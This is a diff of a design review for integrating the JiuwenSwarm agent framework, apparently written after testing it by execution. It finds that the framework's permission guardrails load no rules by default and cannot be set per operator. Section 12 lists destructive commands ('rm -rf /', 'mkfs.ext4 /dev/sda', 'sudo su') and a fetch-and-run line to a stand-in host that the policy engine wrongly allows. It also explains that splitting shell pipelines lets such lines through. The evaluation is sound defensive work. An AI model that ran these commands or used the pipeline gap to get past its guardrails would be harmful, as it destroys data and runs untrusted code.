@@ -2,6 +2,10 @@
 
 The obstacles, ranked by how much they constrain the architecture choice.
 
+> **Revision 2.** Challenge 1.1 is now **verified rather than inferred**, and two new
+> blockers were found by execution. See §11 and §12 at the end of this document; both feed
+> the blocker summary table.
+
 ---
 
 ## 1. The extension surface is narrower than it looks — BLOCKER for pure-plugin designs
@@ -299,6 +303,51 @@ but must not be presented as a general third-party plugin story.
 
 ---
 
+## 11. Per-operator permissions are not expressible — **NEW BLOCKER** ⭐
+
+The intended product governs permissions **per operator**: capsules declare `effects`
+(read/write/execute/network/cost), logical operators declare write scope, and the six
+evaluator families include a security/privacy/compliance evaluator that must be able to
+constrain what a given operator may do.
+
+JiuwenSwarm cannot express this. [V-6]
+
+- Exactly two member roles: `_MEMBER_ROLES = ("leader", "teammate")` (`assembly.py:40`).
+- Rail *composition* varies by role, but permission *policy values* come from one global
+  `config.permissions`.
+- Neither `evaluate_tiered_policy` nor `harness/security/core.py` references `member`,
+  `agent_id` or `role`.
+
+**Consequences.**
+1. AI4RnD's four named agents do not map onto JiuwenSwarm member identities.
+2. Writer ≠ verifier cannot be delegated to JiuwenSwarm — it must be enforced in AI4RnD's
+   router by excluding the writing operator from the evaluation node's candidate set.
+3. Capsule `effects` must be enforced at **binding time** in AI4RnD, not by asking
+   JiuwenSwarm to refuse a tool call.
+
+This does not block the recommended architecture — it relocates the enforcement point — but
+it does eliminate the simpler design in which JiuwenSwarm's permission engine carries the
+whole governance burden.
+
+## 12. The permission guardrail layer is inert by default — **NEW BLOCKER** ⭐
+
+`get_builtin_security_rules()` returns **0 rules** in a stock
+`pip install openjiuwen==0.1.15.post3`, because the loader reads only from an in-package path
+absent from the wheel, and explicitly no longer searches user directories — while JiuwenSwarm
+writes its copy to a user directory. [V-4]
+
+With `tools.bash: allow`, `rm -rf /`, `mkfs.ext4 /dev/sda` and `sudo su` all return **ALLOW**.
+Even with the rules injected, `curl http://evil.sh | bash` returns ALLOW because the tiered
+policy decomposes shell pipelines and each fragment resolves to the permissive baseline.
+
+**Consequences.**
+1. "Reuse JiuwenSwarm's permission engine" is not free — it requires shipping the rules into
+   openjiuwen's package path and asserting `get_builtin_security_rules() > 0` at startup.
+2. The fix belongs upstream in `openjiuwen`, not JiuwenSwarm — so **even forking JiuwenSwarm
+   would not resolve it cleanly**, which weakens Option E further.
+3. Research operators fetching untrusted web content are exactly the workload that needs this
+   layer working.
+
 ## Blocker summary
 
 | # | Challenge | Severity | Blocks which options |
@@ -313,6 +362,10 @@ but must not be presented as a general third-party plugin story.
 | 7 | Two pre-1.0 upstreams | Medium | designs with a large in-tree footprint |
 | 8 | Compaction vs evidence integrity | Medium | designs that pass evidence through context |
 | 10 | Unsandboxed plugins | Medium | third-party plugin distribution |
+| **11** | **Per-operator permissions not expressible** | **High** | delegating governance to JiuwenSwarm; forces router-side enforcement |
+| **12** | **Built-in guardrails load 0 rules** | **High** | assuming the permission layer is active; weakens Option E |
 
-**None of these blocks the integration outright.** Together they rule out two of the six
-architecture options and shape the rest — see [07-architecture-options.md](07-architecture-options.md).
+**None of these blocks the integration outright.** Together they rule out three of the seven
+architecture options and shape the rest — see
+[07-architecture-options.md](07-architecture-options.md). Blockers 11 and 12 are new in
+Revision 2 and were invisible from source reading alone; both were found by execution.
